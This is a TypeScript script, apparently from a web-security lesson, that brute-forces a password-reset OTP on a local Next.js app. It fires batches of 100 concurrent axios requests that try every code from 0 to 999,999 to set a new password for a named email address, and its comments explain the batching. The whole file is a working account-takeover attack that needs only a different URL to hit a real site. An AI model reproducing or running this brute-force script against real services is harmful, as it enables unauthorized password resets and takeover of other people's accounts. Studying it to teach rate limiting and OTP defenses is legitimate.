import axios from "axios";

async function sendRequest(otp: number) {
  let data = JSON.stringify({
    email: "harkirat@gmail.com",
    otp: otp,
    newPassword: "123123123",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "sec-ch-ua":
        '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      "Next-Router-State-Tree":
        "%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
      "sec-ch-ua-mobile": "?0",
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
      Accept: "text/x-component",
      Referer: "http://localhost:3000/admin",
      "Next-Action": "a221b071140e55563e91a3226c508cb229c121f6",
      "sec-ch-ua-platform": '"macOS"',
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config);
    console.log("done for " + otp);
  } catch (e) {}
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      // pushing 100 promises to array
      promises.push(sendRequest(i + j));
    }
    // resolving all 100 promises
    await Promise.all(promises);
  }
}

main();

// we can get it from postman - </> icon => import code
// We’ve added batching here and we’re sending 100 req at a time
// using axios.request we can pass a config object and make a request.
// we are batching the request, beacuse it won't work in production environment , for loop might work locally, if the otp is not too long and far away in for loop, else it will run out of memory. as the async method returns a promise
// since the sendRequest method is async, so we have to wait for all requests to complete / happen before we move on to the next iteration / batch.
// so we are creating a in-memory variable promises = [], and we are pushing each pending request to the array (Promise) and then we are using await Promise.all() to resolve all and move on to the next iteration.
